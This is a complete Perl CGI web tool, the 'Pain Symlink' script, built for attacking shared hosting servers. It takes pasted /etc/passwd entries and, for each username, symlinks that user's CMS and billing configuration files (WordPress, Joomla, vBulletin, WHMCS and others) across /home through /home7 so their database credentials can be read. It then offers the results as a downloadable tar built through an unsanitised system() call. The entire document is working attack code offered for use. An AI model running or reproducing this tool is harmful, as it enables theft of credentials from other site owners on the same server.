#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>[~] Pain Symlink</title>
<style type="text/css">
.newStyle1 {
 font-family: Tahoma;
 font-size: x-small;
 font-weight: bold;
 color: #009900;
  text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$kola=$msr."/".$user;
$kola=~s/\n//g;
symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home2/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home2/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home2/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home2/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home2/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home2/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home2/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home2/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home2/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home2/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home2/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home2/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home2/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home2/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home2/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home2/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home2/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home2/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home2/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home2/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home2/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home2/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home3/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home3/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home3/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home3/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home3/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home3/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home3/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home3/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home3/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home3/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home3/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home3/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home3/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home3/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home3/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home3/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home3/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home3/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home3/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home3/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home3/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home3/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home4/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home4/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home4/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home4/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home4/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home4/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home4/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home4/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home4/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home4/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home4/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home4/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home4/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home4/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home4/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home4/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home4/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home4/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home4/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home4/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home4/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home4/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home5/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home5/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home5/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home5/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home5/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home5/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home5/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home5/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home5/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home5/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home5/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home5/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home5/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home5/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home5/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home5/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home5/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home5/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home5/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home5/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home5/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home5/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home6/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home6/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home6/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home6/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home6/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home6/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home6/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home6/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home6/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home6/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home6/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home6/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home6/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home6/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home6/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home6/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home6/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home6/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home6/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home6/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home6/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home6/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$kola.'-->vBulletin1.txt');
symlink('/home7/'.$user.'/public_html/includes/config.php',$kola.'-->vBulletin2.txt');
symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$kola.'-->vBulletin3.txt');
symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$kola.'-->vBulletin4.txt');
symlink('/home7/'.$user.'/public_html/config.php',$kola.'-->Phpbb1.txt');
symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$kola.'-->Phpbb2.txt');
symlink('/home7/'.$user.'/public_html/wp-config.php',$kola.'-->Wordpress1.txt');
symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$kola.'-->Wordpress2.txt');
symlink('/home7/'.$user.'/public_html/configuration.php',$kola.'-->Joomla1.txt');
symlink('/home7/'.$user.'/public_html/blog/configuration.php',$kola.'-->Joomla2.txt');
symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$kola.'-->Joomla3.txt');
symlink('/home7/'.$user.'/public_html/whm/configuration.php',$kola.'-->Whm1.txt');
symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$kola.'-->Whm2.txt');
symlink('/home7/'.$user.'/public_html/support/configuration.php',$kola.'-->Whm3.txt');
symlink('/home7/'.$user.'/public_html/client/configuration.php',$kola.'-->Whm4.txt');
symlink('/home7/'.$user.'/public_html/billings/configuration.php',$kola.'-->Whm5.txt');
symlink('/home7/'.$user.'/public_html/billing/configuration.php',$kola.'-->Whm6.txt');
symlink('/home7/'.$user.'/public_html/clients/configuration.php',$kola.'-->Whm7.txt');
symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$kola.'-->Whm8.txt');
symlink('/home7/'.$user.'/public_html/order/configuration.php',$kola.'-->Whm9.txt');
symlink('/home7/'.$user.'/public_html/admin/conf.php',$kola.'-->5.txt');
symlink('/home7/'.$user.'/public_html/admin/config.php',$kola.'-->4.txt');
symlink('/home7/'.$user.'/public_html/conf_global.php',$kola.'-->invisio.txt');
symlink('/home7/'.$user.'/public_html/include/db.php',$kola.'-->7.txt');
symlink('/home7/'.$user.'/public_html/connect.php',$kola.'-->8.txt');
symlink('/home7/'.$user.'/public_html/mk_conf.php',$kola.'-->mk-portale1.txt');
symlink('/home7/'.$user.'/public_html/include/config.php',$kola.'-->12.txt');
symlink('/home7/'.$user.'/public_html/settings.php',$kola.'-->Smf.txt');
symlink('/home7/'.$user.'/public_html/includes/functions.php',$kola.'-->phpbb3.txt');
symlink('/home7/'.$user.'/public_html/include/db.php',$kola.'-->infinity.txt');
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1" bgcolor="#222222">
<p>Pain Script To Symlink Configs</p>
<p><font color="#009900">[</font> ReCoded by Virusa Worm <font color="#009900">|</font> Original Coded by Karar aLShaMi <font color="#009900">| </font> 
Developed By Hidden Pain <font color="#009900">]</font></p>
<form method="post">
<textarea name="pass" rows="25" cols="70"  style="border: 1px solid #007700; border-radius: 4px; box-shadow: 0px 0px 4px black; background-color:#222222; font-family:Tahoma; font-size:8pt; color:#00aa00;"  ></textarea><br />
&nbsp;<p>
<input name="tar" type="text" style="border: 1px solid #007700; border-radius: 4px; box-shadow: 0px 0px 4px black; background-color:#222222; font-family:Tahoma; font-size:8pt; color:#ababab; "  /><br />
&nbsp;</p>
<p>
<input name="Submit1" type="submit" value="Get Config" style="border:1px #007700; border-radius: 4px; width: 99; font-family:Tahoma; font-size:10pt; color:#222222; text-transform:uppercase; height:23; background-color:#e4e4e4" /></p>
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1" bgcolor="#222222">
<p>Done !!</p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar"><font color="#00ff00">
<span style="text-decoration: none">Click Here To Download Tar File</span></font></a></p>';
}
}
 print"
</body>
</html>";